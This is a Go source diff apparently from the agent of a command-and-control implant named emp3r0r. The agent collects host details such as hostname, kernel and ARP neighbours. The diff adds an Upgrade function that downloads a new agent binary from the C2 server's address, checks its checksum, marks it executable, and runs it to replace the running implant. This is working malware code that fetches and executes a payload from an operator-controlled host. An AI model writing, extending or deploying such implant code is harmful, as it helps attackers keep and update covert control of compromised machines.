@@ -8,6 +8,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strconv"
@@ -86,6 +87,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
 	info.Tag = emp3r0r_data.AgentTag // use hostid
 	info.Hostname = hostname
+	info.Version = emp3r0r_data.Version
 	info.Kernel = util.GetKernelVersion()
 	info.Arch = runtime.GOARCH
 	info.CPU = util.GetCPUInfo()
@@ -122,6 +124,23 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.ARP = IPNeigh()
 
 	return &info
+}
+
+func Upgrade(checksum string) error {
+	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
+	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
+	if err != nil {
+		return fmt.Errorf("Download agent: %v", err)
+	}
+	download_checksum := tun.SHA256SumFile(tempfile)
+	if checksum != download_checksum {
+		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
+	}
+	err = os.Chmod(tempfile, 0755)
+	if err != nil {
+		return fmt.Errorf("chmod %s: %v", tempfile, err)
+	}
+	return exec.Command(tempfile, "-replace").Start()
 }
 
 func calculateReverseProxyPort() string {
